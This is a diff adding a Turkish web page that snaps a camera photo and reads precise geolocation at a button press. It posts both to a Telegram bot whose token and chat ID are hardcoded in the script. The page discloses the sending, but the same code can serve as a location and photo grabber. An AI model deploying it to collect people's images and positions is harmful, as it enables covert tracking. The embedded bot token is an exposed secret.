@@ -1,1 +1,136 @@
 
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Foto+Konum Gönder</title>
+<style>
+*{box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+body{max-width:500px;margin:0 auto;padding:20px;text-align:center;background:#f5f5f5}
+.kutu{background:white;padding:30px;border-radius:16px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+button{background:#25d366;color:white;border:none;padding:14px 28px;font-size:18px;border-radius:8px;cursor:pointer;margin:10px}
+button:disabled{background:#ccc;cursor:not-allowed}
+#durum{margin:20px 0;padding:15px;border-radius:8px;background:#e8f5e9;display:none}
+#onizleme{max-width:100%;border-radius:8px;margin:15px 0;display:none}
+.yukleniyor{display:inline-block;width:20px;height:20px;border:3px solid #ddd;border-top-color:#25d366;border-radius:50%;animation:dön .8s linear infinite}
+@keyframes dön{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="kutu">
+<h2>📷 + 📍 → Telegram</h2>
+<p id="bilgi">Aşağıdaki butona bas, foto çek ve konumunu gönder</p>
+
+<button id="baslaBtn" onclick="basla()">İşlemi Başlat</button>
+
+<div id="durum">
+<div id="yazi">İşleniyor...</div>
+<div id="donen" class="yukleniyor" style="display:none"></div>
+</div>
+
+<img id="onizleme" alt="Çekilen foto">
+</div>
+
+<script>
+const BOT_TOKEN = "9136885793:AAFr4R9t-SssC-uwStTMhsiemGL4BpSE6Yk";
+const KENDI_ID = "8873203417";
+
+let fotoVeri = null;
+let konum = null;
+
+async function basla(){
+  baslaBtn.disabled = true;
+  durum.style.display = "block";
+  yazi.textContent = "📷 Kamera açılıyor...";
+  
+  try{
+    const akis = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+    const video = document.createElement("video");
+    video.srcObject = akis;
+    await video.play();
+    
+    const ket = document.createElement("canvas");
+    ket.width = video.videoWidth;
+    ket.height = video.videoHeight;
+    ket.getContext("2d").drawImage(video,0,0);
+    fotoVeri = ket.toDataURL("image/jpeg",0.8);
+    
+    akis.getTracks().forEach(t=>t.stop());
+    
+    onizleme.src = fotoVeri;
+    onizleme.style.display = "block";
+    yazi.textContent = "📷 Foto çekildi ✅\n📍 Konum alınıyor...";
+    
+    konum = await new Promise((çöz,ret)=>{
+      if(!navigator.geolocation) return ret(new Error("Konum özelliği yok"));
+      navigator.geolocation.getCurrentPosition(
+        p=>çöz({enlem:p.coords.latitude,boylam:p.coords.longitude}),
+        h=>çöz({enlem:null,boylam:null,hata:h.message}),
+        {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+      );
+    });
+    
+    yazi.textContent = "📤 Telegram'a gönderiliyor...";
+    donen.style.display = "inline-block";
+    
+    await gonderTelegram();
+    
+    yazi.innerHTML = "✅ Tamamlandı!<br>Foto ve konum gönderildi.";
+    
+  }catch(hata){
+    yazi.textContent = "❌ Hata: " + hata.message;
+  }finally{
+    donen.style.display = "none";
+    baslaBtn.disabled = false;
+  }
+}
+
+async function gonderTelegram(){
+  let konumYazisi = "";
+  if(konum && konum.enlem){
+    konumYazisi = `📍 Konum: ${konum.enlem}, ${konum.boylam}
+🗺️ Harita: https://www.google.com/maps?q=${konum.enlem},${konum.boylam}`;
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:KENDI_ID,text:konumYazisi})
+    });
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:KENDI_ID,latitude:konum.enlem,longitude:konum.boylam})
+    });
+  }else{
+    konumYazisi = "⚠️ Konum alınamadı";
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:KENDI_ID,text:konumYazisi})
+    });
+  }
+  
+  if(fotoVeri){
+    const form = new FormData();
+    form.append("chat_id",KENDI_ID);
+    form.append("photo",veriURLyeDonustur(fotoVeri),"foto.jpg");
+    form.append("caption","📷 Çekilen fotoğraf\n" + konumYazisi.split("\n")[0]);
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      body:form
+    });
+  }
+}
+
+function veriURLyeDonustur(base64){
+  const pano = atob(base64.split(",")[1]);
+  const dizi = new Uint8Array(pano.length);
+  for(let i=0;i<pano.length;i++) dizi[i] = pano.charCodeAt(i);
+  return new Blob([dizi],{type:"image/jpeg"});
+}
+</script>
+</body>
+</html>
